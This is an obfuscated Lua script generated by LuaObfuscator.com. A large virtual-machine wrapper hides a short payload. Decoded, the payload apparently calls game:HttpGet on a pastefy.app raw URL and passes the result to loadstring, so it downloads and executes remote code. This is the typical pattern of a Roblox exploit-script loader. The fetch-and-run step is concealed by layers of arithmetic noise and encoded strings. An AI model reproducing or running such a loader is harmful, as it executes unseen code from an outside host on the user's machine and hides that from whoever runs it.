--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v90=v2(v0(v30,16));if v19 then local v109=0;local v110;while true do if (v109==0) then v110=v5(v90,v19);v19=nil;v109=1;end if (v109==1) then return v110;end end else return v90;end end end);local function v20(v31,v32,v33) if v33 then local v91=(v31/(((2 + 3) -3)^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + 1 + 0)) ;return v91-(v91%((1497 -(282 + 595)) -(555 + 64))) ;else local v92=2^(v32-(932 -(857 + 74))) ;return (((v31%(v92 + v92))>=v92) and (569 -(367 + 201))) or (927 -(214 + (2350 -(1523 + 114)))) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 + 0 ;local v36;local v37;while true do if (v35==(0 -(117 -(32 + 85)))) then v36,v37=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;v35=4 -3 ;end if (v35==1) then return (v37 * 256) + v36 ;end end end local function v23() local v38=0 + 0 ;local v39;local v40;local v41;local v42;while true do if (0==v38) then v39,v40,v41,v42=v1(v16,v18,v18 + 1 + 2 );v18=v18 + 4 ;v38=958 -(892 + 65) ;end if (v38==(2 -1)) then return (v42 * (31011612 -14234396)) + (v41 * (120312 -54776)) + (v40 * ((786 -(67 + 113)) -(87 + 263))) + v39 ;end end end local function v24() local v43=v23();local v44=v23();local v45=1 + 0 ;local v46=(v20(v44,1 + 0 + 0 ,(41 + 8) -29 ) * ((2 + 0)^((796 -(201 + 571)) + 8))) + v43 ;local v47=v20(v44,83 -62 ,983 -(802 + (1288 -(116 + 1022))) );local v48=((v20(v44,823 -(368 + 423) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;if (v47==(997 -(915 + 82))) then if (v46==(0 -0)) then return v48 * (0 -0) ;else v47=(4 -3) + 0 ;v45=0 -0 ;end elseif (v47==(3234 -(1069 + 118))) then return ((v46==(438 -(145 + 293))) and (v48 * ((2 -1)/0))) or (v48 * NaN) ;end return v8(v48,v47-(1453 -(44 + 386)) ) * (v45 + (v46/(((2 + 1) -1)^(1538 -(998 + 488))))) ;end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;local v51={};for v67=1, #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100,v101) local v102=(function() return 0 + 0 ;end)();local v93=(function() return;end)();local v94=(function() return;end)();while true do if (v102==(0 + 0)) then local v116=(function() return 0 + 0 ;end)();while true do if (v116==0) then v93=(function() return 0;end)();v94=(function() return nil;end)();v116=(function() return 1385 -(746 + 638) ;end)();end if (v116~=(837 -(660 + 176))) then else v102=(function() return 1;end)();break;end end end if (v102~=(1 -0)) then else while true do if (v93==(341 -(218 + 123))) then v94=(function() return v95();end)();if (v96(v94, #"~", #",")~=0) then else local v122=(function() return 0 + 0 ;end)();local v123=(function() return;end)();local v124=(function() return;end)();local v125=(function() return;end)();local v126=(function() return;end)();while true do if (v122==(202 -(14 + 188))) then local v141=(function() return 0;end)();while true do if (v141==(0 + 0)) then v123=(function() return 675 -(534 + 141) ;end)();v124=(function() return nil;end)();v141=(function() return 1;end)();end if (v141~=(1 + 0)) then else v122=(function() return 1 + 0 ;end)();break;end end end if (v122==(1 -0)) then local v142=(function() return 1467 -(899 + 568) ;end)();while true do if (v142==0) then v125=(function() return nil;end)();v126=(function() return nil;end)();v142=(function() return 1;end)();end if ((1 + 0)~=v142) then else v122=(function() return 2 + 0 ;end)();break;end end end if ((2 + 0)==v122) then while true do if (v123~= #"|") then else local v178=(function() return 0 -0 ;end)();while true do if (v178~=(604 -(268 + 335))) then else v123=(function() return 3 -1 ;end)();break;end if (0==v178) then v126=(function() return {v97(),v97(),nil,nil};end)();if (v124==0) then local v184=(function() return 0 -0 ;end)();local v185=(function() return;end)();while true do if (v184~=(0 + 0)) then else v185=(function() return 0 + 0 ;end)();while true do if (v185==0) then v126[ #"91("]=(function() return v97();end)();v126[ #"?id="]=(function() return v97();end)();break;end end break;end end elseif (v124== #"|") then v126[ #"xnx"]=(function() return v98();end)();elseif (v124==2) then v126[ #"91("]=(function() return v98() -((1458 -(282 + 1174))^16) ;end)();elseif (v124== #"asd") then local v192=(function() return 396 -(115 + 281) ;end)();local v193=(function() return;end)();while true do if ((0 -0)==v192) then v193=(function() return 0 + 0 ;end)();while true do if (0~=v193) then else v126[ #"xxx"]=(function() return v98() -((4 -2)^(1040 -(706 + 318))) ;end)();v126[ #".dev"]=(function() return v97();end)();break;end end break;end end end v178=(function() return 3 -2 ;end)();end end end if (v123==(1273 -(945 + 326))) then local v179=(function() return 0 -0 ;end)();while true do if (v179==0) then if (v96(v125, #"}", #"~")== #".") then v126[2]=(function() return v99[v126[869 -(550 + 317) ]];end)();end if (v96(v125,702 -(271 + 429) ,2 -0 )~= #"~") then else v126[ #"asd"]=(function() return v99[v126[ #"xnx"]];end)();end v179=(function() return 1 -0 ;end)();end if (v179==1) then v123=(function() return  #"-19";end)();break;end end end if ((0 -0)==v123) then local v180=(function() return 285 -(134 + 151) ;end)();local v181=(function() return;end)();while true do if ((1665 -(970 + 695))==v180) then v181=(function() return 0 -0 ;end)();while true do if (v181==(1990 -(582 + 1408))) then v124=(function() return v96(v94,1173 -(418 + 753) , #"asd");end)();v125=(function() return v96(v94, #"asd1",20 -14 );end)();v181=(function() return 1 -0 ;end)();end if (v181~=(3 -2)) then else v123=(function() return  #",";end)();break;end end break;end end end if (v123== #"91(") then if (v96(v125, #"19(", #"xxx")== #">") then v126[ #"0313"]=(function() return v99[v126[ #"0836"]];end)();end v100[v101]=(function() return v126;end)();break;end end break;end end end break;end end return v93,v94,v95,v96,v97,v98,v99,v100,v101;end end end;end)();local v53=(function() return function(v103,v104,v105) local v106=(function() return 0 + 0 ;end)();while true do if (v106==(1824 -(1195 + 629))) then local v117=(function() return 0 -0 ;end)();while true do if (0~=v117) then else local v121=(function() return 0;end)();while true do if (v121~=(241 -(187 + 54))) then else v103[v104-#"{" ]=(function() return v105();end)();return v103,v104,v105;end end end end end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"{",v58 do local v70=(function() return 0 + 0 ;end)();local v71=(function() return;end)();local v72=(function() return;end)();local v73=(function() return;end)();while true do if (1==v70) then v73=(function() return nil;end)();while true do if (v71~=(0 + 0)) then else v72=(function() return v21();end)();v73=(function() return nil;end)();v71=(function() return 1 -0 ;end)();end if ((1 -0)==v71) then if (v72== #"]") then v73=(function() return v21()~=(0 + 0) ;end)();elseif (v72==(1 + 1)) then v73=(function() return v24();end)();elseif (v72== #"xxx") then v73=(function() return v25();end)();end v59[v69]=(function() return v73;end)();break;end end break;end if ((1636 -(1373 + 263))==v70) then local v111=(function() return 0 -0 ;end)();while true do if (v111==(1000 -(451 + 549))) then v71=(function() return 0 -0 ;end)();v72=(function() return nil;end)();v111=(function() return 1 + 0 ;end)();end if (v111==(1 + 0)) then v70=(function() return 1 -0 ;end)();break;end end end end end v57[ #"xnx"]=(function() return v21();end)();for v74= #"/",v23() do FlatIdent_781F8,Descriptor,v21,v20,v22,v23,v59,v54,v74=(function() return v52(FlatIdent_781F8,Descriptor,v21,v20,v22,v23,v59,v54,v74);end)();end for v75= #"}",v23() do v55,v75,v28=(function() return v53(v55,v75,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1 + (216 -(42 + 174)) ];local v65=v61[(4 + 1) -3 ];local v66=v61[7 -4 ];return function(...) local v76=v64;local v77=v65;local v78=v66;local v79=v27;local v80=115 -(4 + 110) ;local v81= -(585 -(57 + 527));local v82={};local v83={...};local v84=v12("#",...) -(754 -(239 + 514)) ;local v85={};local v86={};for v107=0,v84 do if ((630<2127) and (v107>=v78)) then v82[v107-v78 ]=v83[v107 + ((37 + 67) -(17 + 86)) ];else v86[v107]=v83[v107 + 1 + 0 ];end end local v87=(v84-v78) + (1 -0) ;local v88;local v89;while true do local v108=0 -0 ;while true do if (v108==(166 -(122 + 44))) then v88=v76[v80];v89=v88[1 -0 ];v108=3 -2 ;end if (v108==(1 + 0)) then if ((v89<=(1 + 2)) or (1938==2514)) then if (v89<=1) then if ((4255>=55) and (v89==0)) then local v128=0;local v129;local v130;local v131;local v132;local v133;while true do if (v128==0) then v129=nil;v130,v131=nil;v132=nil;v133=nil;v86[v88[2]]={};v80=v80 + 1 ;v128=1 -0 ;end if ((2999>1156) and (v128==((30 + 39) -(30 + (1539 -(363 + 1141)))))) then v81=(v131 + v133) -1 ;v129=0 + (1580 -(1183 + 397)) ;for v175=v133,v81 do v129=v129 + (1258 -(1043 + (1543 -(797 + 532)))) ;v86[v175]=v130[v129];end v80=v80 + (3 -2) ;v88=v76[v80];v133=v88[1214 -(323 + 889) ];v128=5;end if ((2350>1155) and (v128==6)) then do return;end break;end if ((4029<=4853) and (v128==(13 -8))) then v86[v133]=v86[v133](v13(v86,v133 + (581 -(263 + 98 + 219)) ,v81));v80=v80 + ((109 + 212) -(53 + (627 -360))) ;v88=v76[v80];v86[v88[1 + 1 ]]();v80=v80 + 1 ;v88=v76[v80];v128=419 -(15 + 398) ;end if ((v128==(985 -(18 + 964))) or (516>3434)) then v88=v76[v80];v86[v88[5 -3 ]]=v88[11 -8 ];v80=v80 + 1 ;v88=v76[v80];v133=v88[2];v130,v131=v79(v86[v133](v13(v86,v133 + 1 + 0 ,v88[2 + 1 ])));v128=3 + 0 + 1 ;end if (v128==(851 -(20 + 830))) then v88=v76[v80];v86[v88[2 + 0 ]]=v63[v88[129 -(116 + 10) ]];v80=v80 + (1203 -(373 + 829)) + 0 ;v88=v76[v80];v86[v88[733 -(476 + 255) ]]=v63[v88[741 -(542 + 196) ]];v80=v80 + ((1131 -(369 + 761)) -0) ;v128=1 + 1 ;end if ((4046>=3033) and (v128==(2 + 0))) then v88=v76[v80];v133=v88[2];v132=v86[v88[2 + 1 ]];v86[v133 + ((1977 -(1913 + 62)) -1) ]=v132;v86[v133]=v132[v88[9 -5 ]];v80=v80 + 1 ;v128=(979 + 575) -(1126 + 425) ;end end else v86[v88[407 -((312 -194) + 167 + 120) ]]();end elseif (v89>(7 -5)) then v86[v88[2]]=v88[1124 -(118 + 1003) ];else v86[v88[2 -0 ]]=v63[v88[(14 -6) -(243 -(64 + 174)) ]];end elseif (v89<=(382 -(21 + 121 + 235))) then if ((v89==((67 -49) -14)) or (2719<=1447)) then v86[v88[1 + 1 ]]={};else do return;end end elseif ((v89<=(983 -(553 + 424))) or (4134<3926)) then local v139=v88[3 -1 ];v86[v139]=v86[v139](v13(v86,v139 + (1 -0) ,v81));elseif ((v89==7) or (164>=2785)) then local v143=v88[2 + 0 ];local v144=v86[v88[3 + (1661 -(1477 + 184)) ]];v86[v143 + 1 + 0 ]=v144;v86[v143]=v144[v88[2 + 2 ]];else local v148=v88[2 + 0 ];local v149,v150=v79(v86[v148](v13(v86,v148 + (2 -1) ,v88[7 -4 ])));v81=(v150 + v148) -1 ;local v151=0 -0 ;for v172=v148,v81 do v151=v151 + (1 -0) + 0 ;v86[v172]=v149[v151];end end v80=v80 + ((340 -(144 + 192)) -3) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F706173746566792E612Q702F4669557945656A712F72617700099Q003Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
